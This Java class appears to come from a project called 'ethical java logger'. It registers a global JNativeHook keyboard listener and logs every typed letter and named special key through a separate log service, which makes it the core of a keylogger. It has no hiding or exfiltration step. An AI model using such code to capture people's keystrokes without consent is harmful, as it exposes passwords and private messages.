package com.mycompany.ethicaljavalogger.services;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyboardHookService implements NativeKeyListener {
    KeyboardLogService keyboardLogService;
    
    public KeyboardHookService() {
        this.keyboardLogService = new KeyboardLogService();
    }
    
    public void startHook() throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        int rawKeyCode = e.getRawCode();
        
        if ((rawKeyCode >= 65 && rawKeyCode <= 90) || (rawKeyCode >= 97 && rawKeyCode <= 122)) {
            String keyChar = String.valueOf(e.getKeyChar());
            this.keyboardLogService.writeInputLog(keyChar);
        }
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        int rawKeyCode = e.getRawCode();
        int keyCode = e.getKeyCode();

        if (!((rawKeyCode >= 65 && rawKeyCode <= 90) || (rawKeyCode >= 97 && rawKeyCode <= 122))) {
            String keyChar = switch (rawKeyCode) {
                case 161 -> "Shift";
                default -> NativeKeyEvent.getKeyText(keyCode);
            };
            
            this.keyboardLogService.writeInputLog("[" + keyChar + "]");
        }
    }
}
